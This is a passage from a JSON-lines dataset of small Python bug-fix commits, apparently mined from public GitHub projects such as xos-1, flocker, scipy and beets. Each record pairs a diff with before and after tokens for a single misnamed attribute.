"CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:file_name\", 3, 64, 3, 73], \"script_name\"]]"}
{"project": "xos-1", "commit_sha": "1a634d28d69326e7b7d050e835e5988fab57cdef", "parent_sha": "d7fc29257bc3813ebf340157ca35a523728293d2", "file_path": "xos/synchronizers/vpn/steps/sync_vpntenant.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class SyncVPNTenant(SyncInstanceUsingAnsible):\n                 \"vpn_subnet\": tenant.vpn_subnet,\n                 \"server_network\": tenant.server_network,\n                 \"clients_can_see_each_other\": tenant.clients_can_see_each_other,\n-                \"instnace_id\": tenant.instance.instnace_id\n+                \"instnace_id\": tenant.instance.instance_id\n                 }\n \n     def run_playbook(self, o, fields):\n", "before": "tenant . instance . instnace_id", "after": "tenant . instance . instance_id", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:instnace_id\", 3, 48, 3, 59], \"instance_id\"]]"}
{"project": "erpnext-v7", "commit_sha": "b1e8be462b819644c2cf41820b833c7dad875411", "parent_sha": "d31de59d2e5f335a034b0ff3f7c8151bdf5efe12", "file_path": "utilities/doctype/patch_util/patch_util.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ class DocType:\n \t\t\td.parenttype = 'DocType'\n \t\t\td.parentfield = 'permissions'\n \t\t\t\n-\t\td.level = level\n+\t\td.permlevel = level\n \t\td.role = role\n \t\td.read = read\n \t\td.write = write\n", "before": "d . level = level", "after": "d . permlevel = level", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:level\", 3, 5, 3, 10], \"permlevel\"]]"}
{"project": "xos-1", "commit_sha": "f6a5f49d90663db9d697236ce1ba086a152f6ee8", "parent_sha": "d9a5e587cb4a3725824fe056d0ab41744e78dafd", "file_path": "xos/services/vpn/admin.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -202,7 +202,7 @@ class VPNTenantForm(forms.ModelForm):\n                 self.instance.pki_dir, \"init-pki\")\n             if (len(self.instance.use_ca_from) > 0):\n                 shutil.copy2(\n-                    self.instance.use_ca_fromp[0].pki_dir + \"/ca.crt\",\n+                    self.instance.use_ca_from[0].pki_dir + \"/ca.crt\",\n                     self.instance.pki_dir)\n             else:\n                 VPNService.execute_easyrsa_command(\n", "before": "shutil . copy2 ( self . instance . use_ca_fromp [ 0 ] . pki_dir + \"/ca.crt\" , self . instance . pki_dir )", "after": "shutil . copy2 ( self . instance . use_ca_from [ 0 ] . pki_dir + \"/ca.crt\" , self . instance . pki_dir )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:use_ca_fromp\", 3, 35, 3, 47], \"use_ca_from\"]]"}
{"project": "xos-1", "commit_sha": "9023df9aaa22d14e64fa036b5d40ce9b1ba71741", "parent_sha": "0918b83ec2b2f66bef3e232e11d57a7fcb43d737", "file_path": "xos/core/xoslib/methods/vpnview.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class VPNTenantList(XOSListCreateAPIView):\n         # Get every privilege for this user\n         queryset = TenantPrivilege.objects.all().filter(user=self.request.user)\n         queryset = [\n-            priv.tenant for priv in queryset if priv.tenant.KIND == VPN_KIND]\n+            priv.tenant for priv in queryset if priv.tenant.kind == VPN_KIND]\n         for tenant in queryset:\n             tenant.script_text = (\n                 tenant.create_client_script(\n", "before": "queryset = [ priv . tenant for priv in queryset if priv . tenant . KIND == VPN_KIND ]", "after": "queryset = [ priv . tenant for priv in queryset if priv . tenant . kind == VPN_KIND ]", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:KIND\", 3, 61, 3, 65], \"kind\"]]"}
{"project": "xos-1", "commit_sha": "648b14958a16bf4081d095efe7bdec511abaa55a", "parent_sha": "9563513e7ab0dc611de6bbbb37262e37c6a3eccc", "file_path": "xos/services/vpn/models.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ class VPNService(Service):\n         full_command = (\n-            VPNService.EASYRSA_COMMAND_PREIX + \" --pki-dir=\" +\n+            VPNService.EASYRSA_COMMAND_PREFIX + \" --pki-dir=\" +\n             pki_dir + \" \" + command)\n         proc = Popen(\n             full_command, shell=True, stdout=PIPE, stderr=PIPE\n", "before": "full_command = ( VPNService . EASYRSA_COMMAND_PREIX + \" --pki-dir=\" + pki_dir + \" \" + command )", "after": "full_command = ( VPNService . EASYRSA_COMMAND_PREFIX + \" --pki-dir=\" + pki_dir + \" \" + command )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:EASYRSA_COMMAND_PREIX\", 1, 24, 1, 45], \"EASYRSA_COMMAND_PREFIX\"]]"}
{"project": "sar-pre-processing", "commit_sha": "ceb29523572cb43046756cac4ec26faabe9e9066", "parent_sha": "93f6bd2ddee5ffccd96d2670a58a57eac34590c3", "file_path": "sar_pre_processing/netcdf_stack.py", "project_url": "https://github.com/multiply-org/sar-pre-processing", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class NetcdfStackCreator(object):\n             self.sigma0_vv_norm_multi = self.dataset.createVariable('sigma0_vv_norm_multi', np.float32,('time','lat','lon'), fill_value=-99999)\n             self.sigma0_vv_norm_multi.units = 'linear'\n             self.sigma0_vh_norm_multi = self.dataset.createVariable('sigma0_vh_norm_multi', np.float32,('time','lat','lon'), fill_value=-99999)\n-            self.sigma0_vh_tempspeckl.units = 'linear'\n+            self.sigma0_vh_norm_multi.units = 'linear'\n \n         self.sigma0_vv_single = self.dataset.createVariable('sigma0_vv_single', np.float32,('time','lat','lon'), fill_value=-99999)\n         self.sigma0_vv_single.units = 'linear'\n", "before": "self . sigma0_vh_tempspeckl . units = 'linear'", "after": "self . sigma0_vh_norm_multi . units = 'linear'", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:sigma0_vh_tempspeckl\", 3, 18, 3, 38], \"sigma0_vh_norm_multi\"]]"}
{"project": "askbot-devel", "commit_sha": "815a41f34eb158a3b51b3febb0bada93bd0ce23d", "parent_sha": "f91d1cd5d15270cc80d8ce391b53e2d2c91d2b0d", "file_path": "askbot/mail/parsing.py", "project_url": "https://github.com/kingctan/askbot-devel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ def strip_email_client_quote_separator(text):\n             return regex.sub('', text)\n     #did not find a quote separator!!! log it\n     log_message = u'\\nno matching quote separator: %s\\n' % text\n-    sys.err.write(log_message.encode('utf-8'))\n+    sys.stderr.write(log_message.encode('utf-8'))\n     return text[:-2]#strip two lines, only guessing here\n \n def extract_reply_contents(text, reply_separator=None):\n", "before": "sys . err . write ( log_message . encode ( 'utf-8' ) )", "after": "sys . stderr . write ( log_message . encode ( 'utf-8' ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:err\", 3, 9, 3, 12], \"stderr\"]]"}
{"project": "xos-1", "commit_sha": "b47da43097e2fd4c230330388c1548ad14c18a37", "parent_sha": "a3cf70cffdfb73353814afad530153cbaf628b12", "file_path": "planetstack/openstack/event_listener.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,5 +99,5 @@ class EventListener:\n \n         f = Fofum()\n         \n-        listener_thread = threading.Thread(target=f.listen_on_event,args=(clid,self.handle_event))\n+        listener_thread = threading.Thread(target=f.listen_for_event,args=(clid,self.handle_event))\n         listener_thread.start()\n", "before": "listener_thread = threading . Thread ( target = f . listen_on_event , args = ( clid , self . handle_event ) )", "after": "listener_thread = threading . Thread ( target = f . listen_for_event , args = ( clid , self . handle_event ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:listen_on_event\", 3, 53, 3, 68], \"listen_for_event\"]]"}
{"project": "askbot-devel", "commit_sha": "03805fe6b24338eff4cb7fdf51de1c1be59cac4f", "parent_sha": "ff84855c68c0259a03add207f2e3b313e0c17621", "file_path": "askbot/tests/email_alert_tests.py", "project_url": "https://github.com/kingctan/askbot-devel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -738,7 +738,7 @@ class FeedbackTests(utils.AskbotTestCase):\n         }\n         response = client.post(reverse('feedback'), data)\n         self.assertEquals(response.status_code, 200)\n-        self.assertEquals(response.template[0].name, 'feedback.html')\n+        self.assertEquals(response.templates[0].name, 'feedback.html')\n \n     def test_mail_moderators(self):\n", "before": "self . assertEquals ( response . template [ 0 ] . name , 'feedback.html' )", "after": "self . assertEquals ( response . templates [ 0 ] . name , 'feedback.html' )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:template\", 3, 36, 3, 44], \"templates\"]]"}
{"project": "harpoon-2", "commit_sha": "b9dc8f6fd8263ca9a4270040c856bafc9727f7a3", "parent_sha": "2867bca1acca49d2192c2e1a8c98ea2e7f3c68ad", "file_path": "harpoon/amazon.py", "project_url": "https://github.com/pombredanne/harpoon-2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ def catch_no_credentials(message, **info):\n             info['error_code'] = error.response[\"ResponseMetadata\"][\"HTTPStatusCode\"]\n             info['error_message'] = error.response[\"Error\"][\"Message\"]\n         else:\n-            info['error_message'] = error.message\n+            info['error_message'] = error.fmt\n \n         raise BadAmazon(message, **info)\n \n", "before": "else : info [ 'error_message' ] = error . message", "after": "else : info [ 'error_message' ] = error . fmt", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:message\", 3, 43, 3, 50], \"fmt\"]]"}
{"project": "Cura", "commit_sha": "11cb9af97f819b362a719ff66ba8e6c7f8ac0464", "parent_sha": "f115fd06198e8a9843895a03a6c21b9f88fea0de", "file_path": "cura/MachineManagerModel.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -107,7 +107,7 @@ class MachineManagerModel(QObject):\n                     if materials:\n                         material_instance_container = materials[0]\n \n-                if material_instance_container == self._empty_materials_container:\n+                if material_instance_container == self._empty_material_container:\n                     Logger.log(\"w\", \"Machine %s defines it has materials but no matererials found\", definition.id)\n \n             quality_instance_container = self._getPreferredContainer(definition, \"preferred_quality\", self._empty_quality_container)\n", "before": "if material_instance_container == self . _empty_materials_container : Logger . log ( \"w\" , \"Machine %s defines it has materials but no matererials found\" , definition . id )", "after": "if material_instance_container == self . _empty_material_container : Logger . log ( \"w\" , \"Machine %s defines it has materials but no matererials found\" , definition . id )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_empty_materials_container\", 3, 56, 3, 82], \"_empty_material_container\"]]"}
{"project": "scipy", "commit_sha": "dda3bdfb39f95163549ff6f49ee5fca19d8195c2", "parent_sha": "d147f30b130a19e9422655e831ac4164d22e8925", "file_path": "scipy/io/matlab/mio.py", "project_url": "https://github.com/bmorris3/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ def loadmat(file_name, mdict=None, appendmat=True, **kwargs):\n     file_name : str\n        Name of the mat file (do not need .mat extension if\n        appendmat==True) Can also pass open file-like object.\n-    m_dict : dict, optional\n+    mdict : dict, optional\n         Dictionary in which to insert matfile variables.\n     appendmat : bool, optional\n        True to append the .mat extension to the end of the given\n", "before": "object . m_dict : dict , optional", "after": "object . mdict : dict , optional", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:m_dict\", 3, 5, 3, 11], \"mdict\"]]"}
{"project": "OpenTidalFarm", "commit_sha": "5ee5ea9bf8de9e0fc842d8f6507c64ffd2a03f40", "parent_sha": "f51e01ef3ae2e84778ce187143a146a3765134a6", "file_path": "tests/optimal_position_mini_model/test_position_optimisation.py", "project_url": "https://github.com/baba-mpe/OpenTidalFarm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class TestPositionOptimisation(object):\n         bounds = [[Constant(0), Constant(0)], [Constant(3000), Constant(1000)]]\n         maximize(rf, bounds=bounds, method=\"SLSQP\")\n \n-        m = farm.turbine_cache[\"position\"][0]\n+        m = farm._parameters[\"position\"][0]\n         log(INFO, \"Solution of the primal variables: m=\" + repr(m) + \"\\n\")\n \n         assert abs(m[0]-1500) < 40\n", "before": "m = farm . turbine_cache [ \"position\" ] [ 0 ]", "after": "m = farm . _parameters [ \"position\" ] [ 0 ]", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:turbine_cache\", 3, 18, 3, 31], \"_parameters\"]]"}
{"project": "flocker", "commit_sha": "86d0cd7ef00b1d2c085a809f4bee190f197bf693", "parent_sha": "f77ee050794a4516a9d87d858583b0d56ac105ce", "file_path": "flocker/route/_iptables.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ def create(ip, port):\n     Create a new TCP proxy to `ip` on port `port`.\n \n     :param ip: The destination to which to proxy.\n-    :type ip: ipaddr.IPAddress\n+    :type ip: ipaddr.IPv4Address\n \n     :param int port: The TCP port number on which to proxy.\n \n", "before": "ip : ipaddr . IPAddress", "after": "ip : ipaddr . IPv4Address", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:IPAddress\", 3, 22, 3, 31], \"IPv4Address\"]]"}
{"project": "flocker", "commit_sha": "ea101383081f9f9a22e79674bf0c8590db76f290", "parent_sha": "73d941029352d4699990dc55e3a1e5cc5254c3b2", "file_path": "flocker/volume/filesystems/zfs.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -169,7 +169,7 @@ class ZFSSnapshots(object):\n         self._filesystem = filesystem\n \n     def create(self, name):\n-        encoded_name = b\"%s@%s\" % (self._filesystem.pool, name.to_bytes())\n+        encoded_name = b\"%s@%s\" % (self._filesystem.name, name.to_bytes())\n         d = zfs_command(self._reactor, [b\"snapshot\", encoded_name])\n         d.addCallback(lambda _: None)\n         return d\n", "before": "encoded_name = b\"%s@%s\" % ( self . _filesystem . pool , name . to_bytes ( ) )", "after": "encoded_name = b\"%s@%s\" % ( self . _filesystem . name , name . to_bytes ( ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:pool\", 3, 53, 3, 57], \"name\"]]"}
{"project": "tools_repo", "commit_sha": "b1d1fd778d5d3d3217023df8b428c5b7fa22a337", "parent_sha": "be4456cf249f29371eef41bed4e15f6d3c1a2cc0", "file_path": "git_config.py", "project_url": "https://github.com/LineageOS/tools_repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -280,7 +280,7 @@ class GitConfig(object):\n       finally:\n         fd.close()\n     except (IOError, TypeError):\n-      if os.path.exists(self.json):\n+      if os.path.exists(self._json):\n         os.remove(self._json)\n \n   def _ReadGit(self):\n", "before": "if os . path . exists ( self . json ) : os . remove ( self . _json )", "after": "if os . path . exists ( self . _json ) : os . remove ( self . _json )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:json\", 3, 30, 3, 34], \"_json\"]]"}
{"project": "flocker", "commit_sha": "71a83a5b00e80276790ff0160c7697116059995f", "parent_sha": "29c0ccda4d4d4959e3a03d094cd5ec73f746ebae", "file_path": "flocker/acceptance/testtools.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -693,7 +693,7 @@ class Cluster(PRecord):\n-        ip_to_uuid = {node.address: node.uuid for node in self.nodes}\n+        ip_to_uuid = {node.hostname: node.uuid for node in self.nodes}\n \n         def got_results(existing_containers):\n             expected = []\n", "before": "ip_to_uuid = { node . address : node . uuid for node in self . nodes }", "after": "ip_to_uuid = { node . hostname : node . uuid for node in self . nodes }", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:address\", 0, 28, 0, 35], \"hostname\"]]"}
{"project": "beets", "commit_sha": "f2ed7b23737e78229bb6400dba6a50afb0f2f25e", "parent_sha": "2e083f0a8c7b477f47539fa10c18797b4799726d", "file_path": "beets/library.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -795,7 +795,7 @@ class Album(LibModel):\n         # the album's directory as `path`.\n         getters = plugins.album_field_getters()\n         getters['path'] = Album.item_dir\n-        getters['albumtotal'] = Album._tracktotal\n+        getters['albumtotal'] = Album._albumtotal\n         return getters\n \n     def items(self):\n", "before": "getters [ 'albumtotal' ] = Album . _tracktotal", "after": "getters [ 'albumtotal' ] = Album . _albumtotal", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_tracktotal\", 3, 39, 3, 50], \"_albumtotal\"]]"}
{"project": "django-machina", "commit_sha": "ecd9322b373b27ce4149e26575b968a7b1827482", "parent_sha": "664f27e4d65b46d0f6e61914bb052417f5b50d48", "file_path": "machina/apps/conversation/attachments/abstract_models.py", "project_url": "https://github.com/eliksir/django-machina", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,4 +27,4 @@ class AbstractAttachment(models.Model):\n         verbose_name_plural = _('Attachments')\n \n     def __str__(self):\n-        return '{}'.format(self.topic.subject)\n+        return '{}'.format(self.post.subject)\n", "before": "return '{}' . format ( self . topic . subject )", "after": "return '{}' . format ( self . post . subject )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:topic\", 3, 33, 3, 38], \"post\"]]"}
{"project": "larray", "commit_sha": "efd5eca945d550625d3ac8c5fdb891ee8f69b6c8", "parent_sha": "b9d3a7641c2255ce363e565ed59632bff36d59e0", "file_path": "larray/viewer.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -261,7 +261,7 @@ class Product(object):\n         return self.length\n \n     def __getitem__(self, key):\n-        if isinstance(key, (int, np.int64)):\n+        if isinstance(key, (int, np.integer)):\n             return tuple(array[i]\n                          for array, i in zip(self.arrays, self.to_tuple(key)))\n         else:\n", "before": "if isinstance ( key , ( int , np . int64 ) ) : return tuple ( array [ i ] for array , i in zip ( self . arrays , self . to_tuple ( key ) ) ) else : ", "after": "if isinstance ( key , ( int , np . integer ) ) : return tuple ( array [ i ] for array , i in zip ( self . arrays , self . to_tuple ( key ) ) ) else : ", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:int64\", 3, 37, 3, 42], \"integer\"]]"}
{"project": "PyMySQL", "commit_sha": "315d164172ef784fbbb2af543bf5104f8f5ddf46", "parent_sha": "871fecfb59727bec49ba9643653e1c758c227125", "file_path": "pymysql/cursors.py", "project_url": "https://github.com/fanout/PyMySQL", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -292,7 +292,7 @@ class SSCursor(Cursor):\n \n     def _query(self, q):\n         conn = self._get_db()\n-        self.lastexecuted = q\n+        self._last_executed = q\n         conn.query(q, unbuffered=True)\n         self._do_get_result()\n         return self.rowcount\n", "before": "self . lastexecuted = q", "after": "self . _last_executed = q", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:lastexecuted\", 3, 14, 3, 26], \"_last_executed\"]]"}
{"project": "fapistrano", "commit_sha": "4b124c4827f44c600a882f86f698f7156d13f7ee", "parent_sha": "b0c87a655cddc714283457fe783b1eb96b505905", "file_path": "fapistrano/cli.py", "project_url": "https://github.com/soasme/fapistrano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ def restart(role, env):\n     fabenv.role = role\n     fabenv.env = env\n     _apply_env_role_config()\n-    execute(deploy.rollback)\n+    execute(deploy.restart)\n \n if __name__ == '__main__':\n     fap()\n", "before": "execute ( deploy . rollback )", "after": "execute ( deploy . restart )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:rollback\", 3, 20, 3, 28], \"restart\"]]"}
{"project": "PyNN", "commit_sha": "edade7e57079a0d919dbead08d08ad4103222bfa", "parent_sha": "ca999bebde9ecdc309796329809c532c9898f655", "file_path": "src/neuron/cells.py", "project_url": "https://github.com/pgleeson/PyNN", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -332,7 +332,7 @@ class Izhikevich_(BaseSingleCompartmentNeuron):\n         assert self.u_init is not None\n         for seg in self:\n             seg.v = self.v_init\n-            seg.uinit = self.u_init\n+            seg.u = self.u_init\n \n \n class GsfaGrrIF(StandardIF):\n", "before": "seg . uinit = self . u_init", "after": "seg . u = self . u_init", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:uinit\", 3, 17, 3, 22], \"u\"]]"}
{"project": "pyload.plugins", "commit_sha": "7cc68adf36b1d9327f8061e4a177d59e76ab5b6a", "parent_sha": "89737cad3e9ae4545613f068c674da39cc15aa14", "file_path": "module/ThreadManager.py", "project_url": "https://github.com/vuolter/pyload.plugins", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -109,7 +109,7 @@ class ThreadManager(Thread):\n         self.lock.acquire()\n \n         if not pyfile.plugin.multi_dl:\n-            self.occ_plugins.remove(pyfile.modul.__name__)\n+            self.occ_plugins.remove(pyfile.plugin.__name__)\n             \n         pyfile.active = False\n \n", "before": "self . occ_plugins . remove ( pyfile . modul . __name__ )", "after": "self . occ_plugins . remove ( pyfile . plugin . __name__ )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:modul\", 3, 44, 3, 49], \"plugin\"]]"}
{"project": "scrapy", "commit_sha": "2b449b6a401e9c894930a1629865719a68b7a38b", "parent_sha": "edf1f39bc0ae60f15fe9611edf266eedae2b2b09", "file_path": "lianjia/lianjia/spiders/lianjiahouse_spider3.py", "project_url": "https://github.com/wk1024105222/scrapy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -182,7 +182,7 @@ class lianjiahouse_spider3(Spider):\n                 after = url[index2:]\n                 for a in range(2, totalPage + 1, 1):\n                     newurl = '%s%d%s' % (before, a, after)\n-                    yield Request(newurl, callback=self.parse_sellHouseItem)\n+                    yield Request(newurl, callback=self.parse_dealHouseItem)\n \n         tmp1 = url.split('/')[-2]\n         xiaoquID = tmp1[tmp1.find('c'):]\n", "before": "yield Request ( newurl , callback = self . parse_sellHouseItem )", "after": "yield Request ( newurl , callback = self . parse_dealHouseItem )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:parse_sellHouseItem\", 3, 57, 3, 76], \"parse_dealHouseItem\"]]"}
{"project": "traitsgui", "commit_sha": "daf273a3227d36c148c23bb5266487c9a3a43e6e", "parent_sha": "ef25a83b21726c5c0df944ccca3bdbb40f682666", "file_path": "enthought/pyface/preference/preference_dialog.py", "project_url": "https://github.com/enthought/traitsgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class PreferenceDialog(SplitDialog):\n         # 'Done' button.\n         done = wx.Button(parent, wx.ID_OK, \"Done\")\n         done.SetDefault()\n-        wx.EVT_BUTTON(parent, wx.ID_OK, self._on_ok)\n+        wx.EVT_BUTTON(parent, wx.ID_OK, self._wx_on_ok)\n         sizer.Add(done)\n \n         return sizer\n", "before": "wx . EVT_BUTTON ( parent , wx . ID_OK , self . _on_ok )", "after": "wx . EVT_BUTTON ( parent , wx . ID_OK , self . _wx_on_ok )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_on_ok\", 3, 46, 3, 52], \"_wx_on_ok\"]]"}
{"project": "lesswrong", "commit_sha": "888067166fa97b069ec84b77552cd3374678279e", "parent_sha": "5182f8c522881ac912cec03af298197764d17051", "file_path": "scripts/posts_with_divs.py", "project_url": "https://github.com/jimrandomh/lesswrong", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,4 +34,4 @@ def posts_with_divs():\n                     article = article.decode('utf-8', errors='ignore')\n                 \n             if '<div' in article:\n-                print >>sys.stderr, link.canonocal_url.encode('utf-8')\n+                print >>sys.stderr, link.canonical_url.encode('utf-8')\n", "before": "print >> sys . stderr , link . canonocal_url . encode ( 'utf-8' )", "after": "print >> sys . stderr , link . canonical_url . encode ( 'utf-8' )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:canonocal_url\", 3, 42, 3, 55], \"canonical_url\"]]"}
{"project": "lesswrong", "commit_sha": "5e17e65eb8d5a5de6e781ffc2bb84a062ee2778a", "parent_sha": "248d573fbb47dddc15842b5284a85bc91bf9f9bc", "file_path": "scripts/configure_discussion_subreddit.py", "project_url": "https://github.com/jimrandomh/lesswrong", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3,7 +3,7 @@\n def configure_discussion():\n   from r2.models import Subreddit\n   s = Subreddit._by_name('discussion')\n-  s.header_image = \"/static/logo-discussion.png\"\n+  s.header = \"/static/logo-discussion.png\"\n   s.stylesheet = \"/static/discussion.css\"\n", "before": "s . header_image = \"/static/logo-discussion.png\"", "after": "s . header = \"/static/logo-discussion.png\"", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:header_image\", 3, 5, 3, 17], \"header\"]]"}
{"project": "kafka-python", "commit_sha": "80078c2ed4e8ef1c346b81a6487db997ae03d439", "parent_sha": "70d2f2630da37ccdf616e28b2bfa8e6c2562960b", "file_path": "kafka/coordinator/abstract.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -574,7 +574,7 @@ class HeartbeatTask(object):\n \n     def _handle_heartbeat_success(self, v):\n         log.debug(\"Received successful heartbeat\")\n-        self.request_in_flight = False\n+        self._request_in_flight = False\n         self._heartbeat.received_heartbeat()\n         ttl = self._heartbeat.ttl()\n         self._client.schedule(self, time.time() + ttl)\n", "before": "self . request_in_flight = False", "after": "self . _request_in_flight = False", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:request_in_flight\", 3, 14, 3, 31], \"_request_in_flight\"]]"}
{"project": "admindojo-client", "commit_sha": "1ae8a3bc6645c31f92f720018d3cb78886779700", "parent_sha": "0a83e886da3f12e0b10ac87879f8e059a7742f00", "file_path": "tests/test_admindojo.py", "project_url": "https://github.com/admindojo/admindojo-client", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,6 +33,6 @@ def test_command_line_interface():\n     result = runner.invoke(cli.main)\n     assert result.exit_code == 0\n     assert 'admindojo.cli.main' in result.output\n-    help_result = runner.invoke(cli.main, ['--help'])\n+    help_result = runner.invoke(cli.cli, ['--help'])\n     assert help_result.exit_code == 0\n     assert '--help  Show this message and exit.' in help_result.output\n", "before": "help_result = runner . invoke ( cli . main , [ '--help' ] )", "after": "help_result = runner . invoke ( cli . cli , [ '--help' ] )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:main\", 3, 37, 3, 41], \"cli\"]]"}
{"project": "cozmo-python-sdk", "commit_sha": "5d7fba4129b67f1ff34adec13c3a1421e295f2a7", "parent_sha": "d278982d5859c3f7389bd6c2cbc475eeaac7e377", "file_path": "src/cozmo/world.py", "project_url": "https://github.com/anki/cozmo-python-sdk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -292,7 +292,7 @@ class World(event.Dispatcher):\n \n     def _recv_msg_robot_observed_object(self, evt, *, msg):\n         #The engine still sends observed messages for fixed custom objects, this is a bug\n-        if evt.msg.objectType == _clad_to_game_cozmo.ObjectType.Custom_Fixed:\n+        if evt.msg.objectType == _clad_to_game_cozmo.ObjectType.CustomFixedObstacle:\n             return\n         obj = self._objects.get(msg.objectID)\n         if not obj:\n", "before": "if evt . msg . objectType == _clad_to_game_cozmo . ObjectType . Custom_Fixed : return", "after": "if evt . msg . objectType == _clad_to_game_cozmo . ObjectType . CustomFixedObstacle : return", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:Custom_Fixed\", 3, 65, 3, 77], \"CustomFixedObstacle\"]]"}
{"project": "spotpy", "commit_sha": "a488d0ea2bc34a8f013f57b798e85e9f5de781b6", "parent_sha": "8e0994f0ed5d482d306d5edd917383b739998945", "file_path": "spotpy/algorithms/_algorithm.py", "project_url": "https://github.com/zutn/spotpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -181,7 +181,7 @@ class _algorithm(object):\n             pass\n         print('End of sampling')\n         text = 'Best run at %i of %i (best like=%g) with parameter set:' % (\n-            self.status.rep, self.status.repetitions, self.status.objectivefunction)\n+            self.status.bestrep, self.status.repetitions, self.status.objectivefunction)\n         print(text)\n         print(self.status.params)\n         text = 'Duration:' + str(round((time.time() - self.status.starttime), 2)) + ' s'\n", "before": "text = 'Best run at %i of %i (best like=%g) with parameter set:' % ( self . status . rep , self . status . repetitions , self . status . objectivefunction )", "after": "text 